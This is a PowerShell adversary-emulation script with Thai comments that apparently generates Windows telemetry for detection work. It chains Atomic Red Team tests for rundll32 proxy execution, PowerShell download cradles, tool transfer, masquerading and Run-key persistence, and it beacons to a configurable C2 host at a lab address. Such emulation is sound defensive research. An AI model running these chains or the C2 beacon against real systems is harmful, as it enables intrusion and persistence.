# initial_access_win.ps1 - execution chain แบบ initial access (Windows)
#
# ทำไมต้องมี scenario นี้:
#   scenario เดิมทั้ง 5 เริ่มจาก PowerShell รัน atomic ตรงๆ ไม่มี "จุดเริ่ม" ที่
#   เหมือนการติดเชื้อจริง (เอกสารเปิดมาโคร, LNK, rundll32 proxy) ทำให้ process tree
#   ตื้นและ ancestor_depth แคบ
#   -> scenario นี้สร้าง chain หลายชั้น: proxy-exec -> script host -> payload
#      ได้ ProcessCreate ที่มี parent-child ลึกขึ้น = ใกล้ malware จริง
#
# ATT&CK:
#   T1204.002  User Execution - Malicious File   (ผ่าน proxy execution)
#   T1218.011  Signed Binary Proxy - Rundll32
#   T1218.005  Signed Binary Proxy - Mshta       (⚠️ ยังไม่ยืนยันเลข - คอมเมนต์ไว้)
#   T1059.001  PowerShell
#   T1059.003  Windows Command Shell             (⚠️ ยังไม่ยืนยันเลข - คอมเมนต์ไว้)
#   T1105      Ingress Tool Transfer
#   T1547.001  Registry Run Keys                 (persistence หลังเข้าถึง)
#   T1036.003  Masquerading - Rename System Utilities
#
# ⚠️ เลข atomic test ทุกบรรทัดมาจาก atomic_report_win.txt ที่รันบน wintarget จริง
#    technique ที่ยังไม่มีในรายงาน (T1218.005, T1059.003) คอมเมนต์ไว้
#    ให้ปลดหลังรัน check_atomics.ps1 -Technique T1218.005,T1059.003 บน wintarget
. "$PSScriptRoot\_lib.ps1"
Banner "initial_access_win"
Setup-Sandbox

$c2Host = if ($env:C2_HOST) { $env:C2_HOST } else { "192.168.56.1" }
$c2Port = if ($env:C2_PORT) { $env:C2_PORT } else { "8080" }
$stage  = "C:\lab_sandbox\ia_stage"
New-Item -ItemType Directory -Path $stage -Force | Out-Null

# ---------- Stage 1: proxy execution (จุดเริ่มของ chain) ----------
# rundll32 / mshta = signed binary ที่รันโค้ดแทน = จุดเริ่มคลาสสิกของ initial access
# ได้ parent เป็น system binary แทนที่จะเป็น powershell.exe ตรงๆ
Write-Host "[ia] proxy execution"
Atomic "T1218.011" "1,2,3,8,9"      # Rundll32 (JS / VBScript / HTA-VBS via URL)
# Atomic "T1218.005" "<เลขจาก checker>"   # Mshta - ยังไม่ยืนยันเลข

# ---------- Stage 2: user execution + scripting ----------
Write-Host "[ia] user execution + scripting"
Atomic "T1204.002" "1,2"            # ⚠️ ยังไม่ยืนยัน - ดูหมายเหตุท้ายไฟล์
Atomic "T1059.001" "5,6,7,8,10,17"  # PowerShell (download cradle + exec)
# Atomic "T1059.003" "<เลขจาก checker>"   # cmd.exe - ยังไม่ยืนยันเลข

# ---------- Stage 3: ดึง payload ลงเครื่อง ----------
Write-Host "[ia] ingress tool transfer"
Atomic "T1105" "7,9,10,15,16"

# staging เพิ่มด้วย built-in (สร้าง chain ที่ลึกขึ้น)
Write-Host "[ia] staging payload"
$payload = "$stage\update.js"
"WScript.Echo('lab stage ok');" | Out-File $payload -Encoding ascii
try {
    cscript //nologo $payload 2>&1 | Out-File "$stage\cscript_out.txt"
} catch { }

# ---------- Stage 4: masquerade + persistence ----------
Write-Host "[ia] masquerade + persistence"
Atomic "T1036.003" "1,3,5,7"        # Rename System Utilities
Atomic "T1547.001" "1,2,8"          # Registry Run Keys

# beacon เพื่อยืนยันว่าติดตั้งสำเร็จ (ได้ NetworkConnect)
Write-Host "[ia] beacon back to C2"
for ($i = 1; $i -le 5; $i++) {
    try {
        Invoke-WebRequest -Uri "http://${c2Host}:${c2Port}/install?id=ia$i" `
            -TimeoutSec 2 -UseBasicParsing | Out-Null
    } catch { }
    Start-Sleep -Seconds 1
}

# ---------- Cleanup ----------
Write-Host "[ia] cleanup"
Atomic-Cleanup "T1218.011" "1,2,3,8,9"
Atomic-Cleanup "T1204.002" "1,2"
Atomic-Cleanup "T1105" "7,9,10,15,16"
Atomic-Cleanup "T1036.003" "1,3,5,7"
Atomic-Cleanup "T1547.001" "1,2,8"

Done-Banner "initial_access_win"

# ==========================================================================
# หมายเหตุก่อนเปิดใช้ scenario นี้เก็บข้อมูลจริง:
#   T1204.002 / T1218.005 / T1059.003 ยังไม่มีใน atomic_report_win.txt รอบล่าสุด
#   ต้องรันบน wintarget ก่อน:
#     .\scenarios_win\check_atomics.ps1 -Technique T1204.002,T1218.005,T1059.003
#   แล้วแก้เลขให้ตรง + เพิ่ม 3 technique นี้เข้า $SCENARIOS ใน check_atomics.ps1
#   ถ้า T1204.002 เลขไม่ตรง scenario จะยัง exit 0 แต่ test ไม่ทำงาน (fail เงียบ)
# ==========================================================================
